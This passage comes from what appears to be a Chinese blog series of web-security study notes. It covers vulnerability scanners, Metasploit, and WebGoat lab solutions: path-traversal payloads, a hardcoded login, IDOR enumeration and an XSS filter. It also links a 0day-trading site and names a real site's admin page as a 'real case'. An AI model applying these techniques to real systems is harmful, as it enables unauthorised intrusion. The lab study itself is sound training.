href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br><img src="/2023/10/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-043/5.png"></p><p>需要在官网弄个账号，获取token，配合上才能用他的漏洞库。<br><img src="/2023/10/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-043/6.png"></p><p>重新来<br><img src="/2023/10/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-043/7.png"></p><p>扫出漏洞：下好exp漏洞利用就行了。<br><img src="/2023/10/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-043/8.png"></p><h4 id="2、已知CMS非框架类—代码审计—qqyewu-php"><a href="#2、已知CMS非框架类—代码审计—qqyewu-php" class="headerlink" title="2、已知CMS非框架类—代码审计—qqyewu_php"></a><font size="4"><strong>2、已知CMS非框架类—代码审计—qqyewu_php</strong></font></h4><p><img src="/2023/10/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-043/9.png"></p><p>代码审计<br><img src="/2023/10/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-043/10.png"></p><h4 id="3、真实案例"><a href="#3、真实案例" class="headerlink" title="3、真实案例"></a><font size="4"><strong>3、真实案例</strong></font></h4><p><img src="/2023/10/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-043/11.png"></p><p><a href="https://www.855km.cn/e/admin/">https://www.855km.cn/e/admin/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-042</title>
      <link href="/2023/10/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-042/"/>
      <url>/2023/10/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-042/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-操作系统之漏洞探针类型利用修复"><a href="#WEB漏洞-操作系统之漏洞探针类型利用修复" class="headerlink" title="WEB漏洞-操作系统之漏洞探针类型利用修复"></a><font size="6"><strong>WEB漏洞-操作系统之漏洞探针类型利用修复</strong></font></h2><span id="more"></span><h3 id="一、思维导图"><a href="#一、思维导图" class="headerlink" title="一、思维导图"></a><font size="5"><strong>一、思维导图</strong></font></h3><p><img src="/2023/10/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-042/1.png"></p><h3 id="二、探针"><a href="#二、探针" class="headerlink" title="二、探针"></a><font size="5"><strong>二、探针</strong></font></h3><h4 id="1、Goby"><a href="#1、Goby" class="headerlink" title="1、Goby"></a><font size="4"><strong>1、Goby</strong></font></h4><p>可以到官网下载，这里使用忍者系统虚拟机里的。<br><img src="/2023/10/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-042/2.png"></p><p>结果：<br><img src="/2023/10/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-042/3.png"></p><h4 id="2、Namp"><a href="#2、Namp" class="headerlink" title="2、Namp"></a><font size="4"><strong>2、Namp</strong></font></h4><p>Nmap –script&#x3D;vuln默认nse插件 Nmap vulscan vulners 调用第三方库探针 加入拓展扫描模块 <a href="https://cnblogs.com/shwang/p/12623669.html">https://cnblogs.com/shwang/p/12623669.html</a><br>扫描：<br><img src="/2023/10/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-042/4.png"></p><p>结果：<br><img src="/2023/10/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-042/5.png"></p><h4 id="3、Nessus"><a href="#3、Nessus" class="headerlink" title="3、Nessus"></a><font size="4"><strong>3、Nessus</strong></font></h4><p>下载地址<br><a href="https://pan.baidu.com/s/17uA2OmJbV_cDG2C6QnHqqA">https://pan.baidu.com/s/17uA2OmJbV_cDG2C6QnHqqA</a>  提取码：cxd4<br>安装教程在文件里有。<br><img src="/2023/10/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-042/6.png"></p><h3 id="三、漏洞类型"><a href="#三、漏洞类型" class="headerlink" title="三、漏洞类型"></a><font size="5"><strong>三、漏洞类型</strong></font></h3><p><strong>1、远程执行<br>2、权限提升<br>3、缓冲区溢出</strong></p><h3 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a><font size="5"><strong>四、漏洞利用</strong></font></h3><p>0day交易<br><a href="https://mrxn.net/share/0day-today.html">https://mrxn.net/share/0day-today.html</a> </p><h4 id="1、Searchploit使用方法"><a href="#1、Searchploit使用方法" class="headerlink" title="1、Searchploit使用方法"></a><font size="4"><strong>1、Searchploit使用方法</strong></font></h4><p><img src="/2023/10/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-042/7.png"><br><img src="/2023/10/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-042/8.png"><br><img src="/2023/10/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-042/9.png"></p><p>然后打开msfcosole，在Nessus上看一下开放的端口和漏洞。</p><h4 id="2、Metasploit"><a href="#2、Metasploit" class="headerlink" title="2、Metasploit"></a><font size="4"><strong>2、Metasploit</strong></font></h4><p><img src="/2023/10/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-042/10.png"><br><img src="/2023/10/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-042/11.png"><br><img src="/2023/10/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-042/12.png"></p><p>然后看一下靶机：<br><img src="/2023/10/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-042/13.png"></p><h3 id="五、涉及资源"><a href="#五、涉及资源" class="headerlink" title="五、涉及资源"></a><font size="5"><strong>五、涉及资源</strong></font></h3><pre class=" language-bash"><code class="language-bash">涉及资源：https://nmap.orghttps://gobies.orghttps://www.cnvd.org.cnhttps://www.seebug.orghttps://www.exploit-db.comhttps://github.com/scipag/vulscanhttps://github.com/vulnersCom/nmap-vulnershttps://github.com/offensive-security/exploitdbhttps://www.cnblogs.com/shwang/p/12623669.htmlhttps://blog.csdn.net/qq_38055050/article/details/80214684https://pan.baidu.com/s/17uA2OmJbV_cDG2C6QnHqqA 提取码：cxd4</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-041</title>
      <link href="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/"/>
      <url>/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-目录遍历访问控制-XSS-等安全问题"><a href="#WEB漏洞-目录遍历访问控制-XSS-等安全问题" class="headerlink" title="WEB漏洞-目录遍历访问控制 XSS 等安全问题"></a><font size="6"><strong>WEB漏洞-目录遍历访问控制 XSS 等安全问题</strong></font></h2><span id="more"></span><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a><font size="5"><strong>一、前言</strong></font></h3><p>前言：<br>注重代码分析，熟悉 javaweb 开发结构，掌握 javaweb 代码审计流程，其次才是相关漏洞解释（因前期漏洞原理已基本讲解完毕），通过本次直播大家务必学会分析相关代码路径，结构，框架等知识点。</p><h4 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a><font size="4"><strong>思维导图</strong></font></h4><p><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/1.png"></p><h3 id="二、知识点"><a href="#二、知识点" class="headerlink" title="二、知识点"></a><font size="5"><strong>二、知识点</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#文件上传配合目录遍历覆盖-文件自定义文件存储地址-基于用户名存储问题</span><span class="token comment" spellcheck="true">#代码解析及框架源码追踪：</span>第一关：Payload: <span class="token punctuation">..</span>/x第二关：Payload: <span class="token punctuation">..</span><span class="token punctuation">..</span>//x</code></pre><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#不安全登录 Insecure Login-基于前端认证</span><span class="token comment" spellcheck="true">#熟悉代码结构及硕源代码文件</span><span class="token comment" spellcheck="true">#访问控制对象-逻辑越权</span><span class="token comment" spellcheck="true">#代码分析过关逻辑</span>枚举用户参数对应数据库的其他数据信息role,userid通过参数值构造 URL 获取用户更多的信息WebGoat/IDOR/profile/2342384</code></pre><pre class=" language-bash"><code class="language-bash">**<span class="token comment" spellcheck="true">#XSS 跨站</span>代码分析结合页面解释过关</code></pre><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#核心知识点：Java 代码分析 === Apk_App 分析</span>模块引用（框架,自带等），路由地址，静态文件（html.js 等）,简易代码理解等</code></pre><h3 id="三、演示案例："><a href="#三、演示案例：" class="headerlink" title="三、演示案例："></a><font size="5"><strong>三、演示案例：</strong></font></h3><h4 id="1、Javaweb-代码分析-目录遍历安全问题"><a href="#1、Javaweb-代码分析-目录遍历安全问题" class="headerlink" title="1、Javaweb 代码分析-目录遍历安全问题"></a><font size="4"><strong>1、Javaweb 代码分析-目录遍历安全问题</strong></font></h4><h5 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a><font size="4"><strong>less-1</strong></font></h5><p><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/2.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/3.png"><br>抓包查看路径</p><p><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/4.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/5.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/6.png"></p><h5 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a><font size="4"><strong>less-2</strong></font></h5><p><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/7.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/8.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/9.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/10.png"></p><h4 id="2、Javaweb-代码分析-前端验证安全问题"><a href="#2、Javaweb-代码分析-前端验证安全问题" class="headerlink" title="2、Javaweb 代码分析-前端验证安全问题"></a><font size="4"><strong>2、Javaweb 代码分析-前端验证安全问题</strong></font></h4><p>登录<br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/11.png"><br>抓包<br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/12.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/13.png"><br>查看源码<br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/14.png"></p><p>检查输入的账号&amp;密码是否等于CaptainJack&amp;BlackPearl等于就返回成功，否者失败！</p><pre class=" language-bash"><code class="language-bash">        <span class="token keyword">return</span> username.toString<span class="token punctuation">(</span><span class="token punctuation">)</span>.equals<span class="token punctuation">(</span><span class="token string">"CaptainJack"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> password.toString<span class="token punctuation">(</span><span class="token punctuation">)</span>.equals<span class="token punctuation">(</span><span class="token string">"BlackPearl"</span><span class="token punctuation">)</span> ? this.success<span class="token punctuation">(</span>this<span class="token punctuation">)</span>.build<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">:</span> this.failed<span class="token punctuation">(</span>this<span class="token punctuation">)</span>.build<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/15.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/16.png"></p><pre class=" language-bash"><code class="language-bash">    var _0xb7f9<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"\x43\x61\x70\x74\x61\x69\x6E\x4A\x61\x63\x6B"</span>,<span class="token string">"\x42\x6C\x61\x63\x6B\x50\x65\x61\x72\x6C"</span>,<span class="token string">"\x73\x74\x72\x69\x6E\x67\x69\x66\x79"</span>,<span class="token string">"\x73\x65\x6E\x64"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>xhttp<span class="token punctuation">[</span>_0xb7f9<span class="token punctuation">[</span>3<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span>JSON<span class="token punctuation">[</span>_0xb7f9<span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;username:_0xb7f9[0],password:_0xb7f9[1]&amp;#125;))</span></code></pre><p><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/17.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/18.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/19.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/20.png"></p><p>使用CaptainJack&amp;BlackPearl登录<br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/21.png"></p><h4 id="3、Javaweb-代码分析-逻辑越权安全问题"><a href="#3、Javaweb-代码分析-逻辑越权安全问题" class="headerlink" title="3、Javaweb 代码分析-逻辑越权安全问题"></a><font size="4"><strong>3、Javaweb 代码分析-逻辑越权安全问题</strong></font></h4><h5 id="less-1-1"><a href="#less-1-1" class="headerlink" title="less-1"></a><font size="4"><strong>less-1</strong></font></h5><p><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/22.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/23.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/24.png"></p><pre class=" language-bash"><code class="language-bash">String<span class="token punctuation">[</span><span class="token punctuation">]</span> diffAttribs <span class="token operator">=</span> attributes.split<span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class=" language-bash"><code class="language-bash">            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">!</span>diffAttribs<span class="token punctuation">[</span>0<span class="token punctuation">]</span>.toLowerCase<span class="token punctuation">(</span><span class="token punctuation">)</span>.trim<span class="token punctuation">(</span><span class="token punctuation">)</span>.equals<span class="token punctuation">(</span><span class="token string">"userid"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>diffAttribs<span class="token punctuation">[</span>1<span class="token punctuation">]</span>.toLowerCase<span class="token punctuation">(</span><span class="token punctuation">)</span>.trim<span class="token punctuation">(</span><span class="token punctuation">)</span>.equals<span class="token punctuation">(</span><span class="token string">"role"</span><span class="token punctuation">))</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">!</span>diffAttribs<span class="token punctuation">[</span>1<span class="token punctuation">]</span>.toLowerCase<span class="token punctuation">(</span><span class="token punctuation">)</span>.trim<span class="token punctuation">(</span><span class="token punctuation">)</span>.equals<span class="token punctuation">(</span><span class="token string">"userid"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>diffAttribs<span class="token punctuation">[</span>0<span class="token punctuation">]</span>.toLowerCase<span class="token punctuation">(</span><span class="token punctuation">)</span>.trim<span class="token punctuation">(</span><span class="token punctuation">)</span>.equals<span class="token punctuation">(</span><span class="token string">"role"</span><span class="token punctuation">))</span> ? this.failed<span class="token punctuation">(</span>this<span class="token punctuation">)</span>.feedback<span class="token punctuation">(</span><span class="token string">"idor.diff.failure"</span><span class="token punctuation">)</span>.build<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">:</span> this.success<span class="token punctuation">(</span>this<span class="token punctuation">)</span>.feedback<span class="token punctuation">(</span><span class="token string">"idor.diff.success"</span><span class="token punctuation">)</span>.build<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>可以观察到只有5个属性，只有role 和userid是隐藏未显示的属性，且代码进一步验证,输入role,userid 即可</p><p><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/25.png"></p><h5 id="less-2-1"><a href="#less-2-1" class="headerlink" title="less-2"></a><font size="4"><strong>less-2</strong></font></h5><p><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/26.png"></p><p>直接抓包看看源码<br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/27.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/28.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/29.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/30.png"></p><p>WebGoat&#x2F;IDOR&#x2F;profile&#x2F;2342384<br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/31.png"></p><h4 id="4、Javaweb-代码分析-XSS-跨站安全问题"><a href="#4、Javaweb-代码分析-XSS-跨站安全问题" class="headerlink" title="4、Javaweb 代码分析-XSS 跨站安全问题"></a><font size="4"><strong>4、Javaweb 代码分析-XSS 跨站安全问题</strong></font></h4><p><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/32.png"></p><p>抓包<br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/33.png"></p><p>看源码<br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/34.png"></p><pre class=" language-bash"><code class="language-bash">        <span class="token keyword">return</span> answer_xss_1.toString<span class="token punctuation">(</span><span class="token punctuation">)</span>.toLowerCase<span class="token punctuation">(</span><span class="token punctuation">)</span>.equals<span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span> ? this.success<span class="token punctuation">(</span>this<span class="token punctuation">)</span>.build<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">:</span> this.failed<span class="token punctuation">(</span>this<span class="token punctuation">)</span>.feedback<span class="token punctuation">(</span><span class="token string">"xss.lesson1.failure"</span><span class="token punctuation">)</span>.build<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>直接输入yes即可<br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/35.png"></p><h5 id="less-2-2"><a href="#less-2-2" class="headerlink" title="less-2"></a><font size="4"><strong>less-2</strong></font></h5><p><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/36.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/37.png"></p><p>查看源码<br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/38.png"></p><pre class=" language-bash"><code class="language-bash">public class CrossSiteScriptingLesson5a extends AssignmentEndpoint <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    public static final Predicate<span class="token operator">&lt;</span>String<span class="token operator">></span> XSS_PATTERN <span class="token operator">=</span> Pattern.compile<span class="token punctuation">(</span><span class="token string">".*&lt;script>(console\\.log|alert)\\(.*\\);?&lt;/script>.*"</span>, 2<span class="token punctuation">)</span>.asMatchPredicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @Autowired    UserSessionData userSessionData<span class="token punctuation">;</span>    public CrossSiteScriptingLesson5a<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>@GetMapping<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"/CrossSiteScripting/attack5a"&amp;#125;)</span>    @ResponseBody    public AttackResult completed<span class="token punctuation">(</span>@RequestParam Integer QTY1, @RequestParam Integer QTY2, @RequestParam Integer QTY3, @RequestParam Integer QTY4, @RequestParam String field1, @RequestParam String field2<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>XSS_PATTERN.test<span class="token punctuation">(</span>field2<span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token keyword">return</span> this.failed<span class="token punctuation">(</span>this<span class="token punctuation">)</span>.feedback<span class="token punctuation">(</span><span class="token string">"xss-reflected-5a-failed-wrong-field"</span><span class="token punctuation">)</span>.build<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>            double totalSale <span class="token operator">=</span> <span class="token punctuation">(</span>double<span class="token punctuation">)</span>QTY1 * 69.99D + <span class="token punctuation">(</span>double<span class="token punctuation">)</span>QTY2 * 27.99D + <span class="token punctuation">(</span>double<span class="token punctuation">)</span>QTY3 * 1599.99D + <span class="token punctuation">(</span>double<span class="token punctuation">)</span>QTY4 * 299.99D<span class="token punctuation">;</span>            this.userSessionData.setValue<span class="token punctuation">(</span><span class="token string">"xss-reflected1-complete"</span>, <span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            StringBuffer cart <span class="token operator">=</span> new StringBuffer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cart.append<span class="token punctuation">(</span><span class="token string">"Thank you for shopping at WebGoat. &lt;br />Your support is appreciated&lt;hr />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cart.append<span class="token punctuation">(</span><span class="token string">"&lt;p>We have charged credit card:"</span> + field1 + <span class="token string">"&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cart.append<span class="token punctuation">(</span><span class="token string">"                             ------------------- &lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cart.append<span class="token punctuation">(</span><span class="token string">"                               $"</span> + totalSale<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>this.userSessionData.getValue<span class="token punctuation">(</span><span class="token string">"xss-reflected1-complete"</span><span class="token punctuation">)</span> <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                this.userSessionData.setValue<span class="token punctuation">(</span><span class="token string">"xss-reflected1-complete"</span>, <span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>XSS_PATTERN.test<span class="token punctuation">(</span>field1<span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                this.userSessionData.setValue<span class="token punctuation">(</span><span class="token string">"xss-reflected-5a-complete"</span>, <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> field1.toLowerCase<span class="token punctuation">(</span><span class="token punctuation">)</span>.contains<span class="token punctuation">(</span><span class="token string">"console.log"</span><span class="token punctuation">)</span> ? this.success<span class="token punctuation">(</span>this<span class="token punctuation">)</span>.feedback<span class="token punctuation">(</span><span class="token string">"xss-reflected-5a-success-console"</span><span class="token punctuation">)</span>.output<span class="token punctuation">(</span>cart.toString<span class="token punctuation">(</span><span class="token punctuation">))</span>.build<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">:</span> this.success<span class="token punctuation">(</span>this<span class="token punctuation">)</span>.feedback<span class="token punctuation">(</span><span class="token string">"xss-reflected-5a-success-alert"</span><span class="token punctuation">)</span>.output<span class="token punctuation">(</span>cart.toString<span class="token punctuation">(</span><span class="token punctuation">))</span>.build<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>                this.userSessionData.setValue<span class="token punctuation">(</span><span class="token string">"xss-reflected1-complete"</span>, <span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> this.failed<span class="token punctuation">(</span>this<span class="token punctuation">)</span>.feedback<span class="token punctuation">(</span><span class="token string">"xss-reflected-5a-failure"</span><span class="token punctuation">)</span>.output<span class="token punctuation">(</span>cart.toString<span class="token punctuation">(</span><span class="token punctuation">))</span>.build<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/39.png"></p><p>继续绕过xss过滤即可</p><h4 id="4、拓展-安卓-APP-反编译-JAVA-代码（审计不香吗？）"><a href="#4、拓展-安卓-APP-反编译-JAVA-代码（审计不香吗？）" class="headerlink" title="4、拓展-安卓 APP 反编译 JAVA 代码（审计不香吗？）"></a><font size="4"><strong>4、拓展-安卓 APP 反编译 JAVA 代码（审计不香吗？）</strong></font></h4><p>打开decompileApk.cmd,然后把apk拖进cmd界面就行。</p><p><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/40.png"><br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/41.png"></p><p>idea查看源码（打不开的话右键添加为库）<br><img src="/2023/10/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-041/42.png"><br>b</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-040</title>
      <link href="/2023/10/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-040/"/>
      <url>/2023/10/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-040/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-JWT安全及预编译CASE注入等"><a href="#WEB漏洞-JWT安全及预编译CASE注入等" class="headerlink" title="WEB漏洞-JWT安全及预编译CASE注入等"></a><font size="6"><strong>WEB漏洞-JWT安全及预编译CASE注入等</strong></font></h2><span id="more"></span><h3 id="一、思维导图"><a href="#一、思维导图" class="headerlink" title="一、思维导图"></a><font size="5"><strong>一、思维导图</strong></font></h3><p><img src="/2023/10/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-040/1.png"><br><img src="/2023/10/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-040/2.png"></p><h3 id="二、JWT安全"><a href="#二、JWT安全" class="headerlink" title="二、JWT安全"></a><font size="5"><strong>二、JWT安全</strong></font></h3><p><img src="/2023/10/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-040/4.png"></p><h3 id="三、什么是-JWT？"><a href="#三、什么是-JWT？" class="headerlink" title="三、什么是 JWT？"></a><font size="5"><strong>三、什么是 JWT？</strong></font></h3><p>JSON Web Token（JSON Web 令牌）是一种跨域验证身份的方案。JWT 不加密传输的数据，但能够通 过数字签名来验证数据未被篡改（但是做完下面的 WebGoat 练习后我对这一点表示怀疑）。 </p><p>JWT 分为三部分，头部（Header），声明（Claims），签名（Signature），三个部分以英文句号.隔开。 JWT 的内容以 Base64URL 进行了编码。  </p><pre class=" language-bash"><code class="language-bash">头部（Header）<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span><span class="token string">"alg"</span><span class="token keyword">:</span><span class="token string">"HS256"</span>,<span class="token string">"typ"</span><span class="token keyword">:</span><span class="token string">"JWT"</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p>alg<br>是说明这个 JWT 的签名使用的算法的参数，常见值用 HS256（默认），HS512 等，也可以为 None。HS256 表示 HMAC SHA256。<br>typ<br>说明这个 token 的类型为 JWT</p><pre class=" language-bash"><code class="language-bash">声明（Claims）<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span><span class="token string">"exp"</span><span class="token keyword">:</span> 1416471934,<span class="token string">"user_name"</span><span class="token keyword">:</span> <span class="token string">"user"</span>,<span class="token string">"scope"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token string">"read"</span>,<span class="token string">"write"</span><span class="token punctuation">]</span>,<span class="token string">"authorities"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token string">"ROLE_ADMIN"</span>,<span class="token string">"ROLE_USER"</span><span class="token punctuation">]</span>,<span class="token string">"jti"</span><span class="token keyword">:</span> <span class="token string">"9bc92a44-0b1a-4c5e-be70-da52075b9a84"</span>,<span class="token string">"client_id"</span><span class="token keyword">:</span> <span class="token string">"my-client-with-secret"</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><h4 id="JWT-固定参数有："><a 